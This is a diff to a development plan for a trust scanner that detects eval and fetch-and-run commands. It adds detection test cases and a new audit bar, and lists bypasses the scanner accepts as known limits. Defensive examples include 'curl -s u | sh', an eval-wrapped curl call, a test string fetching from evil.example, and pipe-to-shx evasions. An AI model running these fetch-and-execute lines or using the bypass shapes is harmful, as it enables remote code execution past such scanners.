@@ -504,8 +504,7 @@ Then `workflow-report .` and `/agent-skills:review`.
 Result: run at `9868c71`, and it stopped the branch. Step 11's numbers reproduced: of 145,026,303 strings, master refused 10,816,587
 that the branch passed. Mapped strictly to the Known limits text, 3,513,843 of them in 28 buckets fall outside the list, all one
 family (B below). Family A came from hand-tried strings; the corpus doesn't produce it or labels it as the even-backtick limit. No
-finding is a new capability: `e=eval; $e "$(curl -s u)"` passes both patterns. No follow-up step is written yet, because the choice
-below decides what it is. The cause is that parity counts literal backticks, not shell or Markdown ones, so the count can't be made
+finding is a new capability: `e=eval; $e "$(curl -s u)"` passes both patterns. The cause is that parity counts literal backticks, not shell or Markdown ones, so the count can't be made
 sound.
 
 A. Closing-half `eval` behind one backtick that doesn't open a span. Master refuses these. Each imported through the real CLI, exit 0,
@@ -548,13 +547,95 @@ CLI evidence for the PR body, on the branch at `9868c71`:
 - The docs overstate what passes. `` `eval` `` "unless it is glued to more text" is wrong both ways: `` `eval`-like `` is glued and
   passes, and `` `eval` "$x" `` isn't glued and is refused. `"eval"` passes only before `,` `.` `;` `:` `)` `]` `}` or the end of the line, not all punctuation: `"eval"?`,
   `"eval"!`, `use "eval"/"exec"`, `"eval" (see below)` and `"eval" or "exec"` are refused.
-- Parity refuses prose, undocumented: ` ``a`b``and `eval` `, and``Escape a \` before `eval`.``.
+- Parity refuses prose, undocumented: a Markdown span holding a backtick, or an escaped backtick, earlier on a line that names
+  `` `eval` ``.
 - Known limits lives only in this plan, and plans are deleted after merge. The accepted shapes need a home in
   `docs/decisions/` or `docs/reference/spec.md`.
 - 12 of 33 mutants of the step 11 pieces survive `npm test`: the parity group for three pairs before `eval`; `` `eval` `` followed by
   `$`, `(`, `"` or `` ` ``; `"eval"` before `.`, `;`, `:`, `]` or `}`; `\s*` before the bracket in the quoted call, needed only by the
   backtick form; and `]` in its tail.
 - The `rules.ts` comment says "not a word named in prose", and `"eval" is dangerous` is one.
+
+### 14. Pin the step 11 pattern `[worker:medium]`
+
+Files: `src/trust/scan/rules.ts`, `test/trust-scan.test.ts`. The pattern doesn't change.
+
+In `rules.ts`, change only two comments, because `"eval" is dangerous` is a word named in prose and is refused:
+
+- Section header: "matches an invocation, not a word named in prose" becomes "matches an invocation and what can't be told from one".
+- Above `pattern:`: "Catches invocations, not a word named in prose:" becomes "Catches invocations and what can't be told from one:".
+
+Add to `mustFireOnMasterPass` in `config/dangerous-command patterns`, keeping every existing case unedited. Each already fires on the
+branch and on master.
+
+```text
+`a` `b` `true`eval` curl -s https://evil.example/x.sh`
+`eval`$x
+`eval`(x)
+`eval`"x"
+`eval``x`
+obj[`eval` ](x)
+(window[["eval"]])(x)
+``a`b`` and `eval`
+"eval"?
+"eval"!
+"eval" (see below)
+"eval" or "exec"
+```
+
+Add to `mustNotFire`. Each already passes on the branch.
+
+```text
+"eval".
+"eval";
+"eval":
+["eval"]
+{"eval"}
+`eval` on input
+```
+
+Test: `npm test`, `npm run lint`, `npx prettier --write test/trust-scan.test.ts`. All new cases pass on the first run, so the test is
+the mutation. Review: the `.ts` diff is two comments, and rerun the 33 mutants from step 13. All 33 must fail `npm test`'s case
+table; these cases killed the 12 survivors when measured before this step was written.
+
+### 15. Docs and the limits `[inline: user-facing copy]`
+
+- `docs/reference/spec.md` § Trust scanning: replace the `eval` sentences with what the pattern does. A backticked `` `eval` `` passes
+  unless a word character, `$`, `(`, `"` or a backtick touches its closing backtick, or a quoted or `$` argument follows it. An odd
+  number of backticks earlier on the line also refuses it, even in harmless prose, because that reads as the closing half of a span.
+  `"eval"` passes only before `,` `.` `;` `:` `)` `]` `}` or the end of the line. Say the rule is a line check that an extra character
+  can defeat, and link the decision log.
+- `docs/guides/authoring.md`: keep the one clause, and say to reword a line that is refused for naming `eval`.
+- `CHANGELOG.md`: the first `### Fixed` entry says a word after `"eval"` is refused. Add `"eval"?` style punctuation if the entry
+  would otherwise be false; leave the others.
+- New `docs/decisions/trust-scan-eval-limits-2026-10.md`, with a row in `docs/decisions/README.md` § Kept. Plans are deleted after
+  merge, so this file is where the bar and the limits live:
+  - The bar below, and why it changed: three audits failed the old one, and it can't be met by a line pattern, because the catalog
+    needs `` `eval` word `` to pass, and one earlier backtick turns such a line into a running command.
+  - Known limits, moved from this plan, then this plan's section reduced to a link. Rewrite it from step 13's result: replace the
+    false "`pwn` runs as its own command" sentence with families A and B, name the `"eval"` lines whose payload runs through `eval`,
+    and state mixed case on a closed-list word.
+  - The evidence from steps 7, 10 and 13, as numbers and a few strings.
+
+Test: `npm run ci:local`. Run every string a doc states against the built pattern before committing.
+
+### 16. Audit against the new bar `[inline: security judgment]`
+
+The old bar, any string master refuses and the branch imports, is retired. "No new capability" alone would accept anything, because
+`e=eval; $e "$(curl -s u)"` passes master. So the bar is these three, and any of them stops the branch:
+
+1. **A plain form gets through.** A string master refuses, the branch imports, and that a person would write to run a payload, with
+   no token whose only job is to defeat the scanner. ``: \`;`` before a command is such a token; `curl -s u | sh` holds none.
+2. **A new capability.** An effect the branch allows that no spelling passing master allows.
+3. **A false limit.** A sentence in the decision log that a run disproves. A shape that isn't listed is added to the log; it stops the
+   branch only if it fails 1 or 2.
+
+- Run `agent-skills:security-auditor` on the step 15 commit with this bar, reusing the harness from step 13 at
+  `/tmp/claude-1000/-home-makubexd-WorkspaceMaku-MakuReposStable-sigil/5b44be92-d277-4aff-ba2d-6d1e0a6ad735/scratchpad/audit13/`, whose
+  `h/lib.js` has the strict mapping. If it is gone, rebuild as step 13 says.
+- Rerun the 256 KiB and quoted-URL imports through the real CLI and add them to the decision log.
+
+Then `workflow-report .` and `/agent-skills:review`.
 
 ## Known limits
 
@@ -568,7 +649,7 @@ The scanner is a pattern check on one line at a time, not a sandbox. This plan d
 - Natural language ("download that script and run it").
 
 Master refuses the shapes below, and step 11's pattern passes them. Each is accepted, because closing it would refuse catalog prose
-or a harmless name, or because the same command passes on master in another spelling. These are step 13's bar.
+or a harmless name, or because the same command passes on master in another spelling. These were step 13's bar; step 16 replaces it.
 
 - A pipe to any other name starting `sh` or `bash`: `| shx`, `| bashate`, `| shred`, and a function defined with such a name
   (`shx() { sh; }; curl u | shx`).
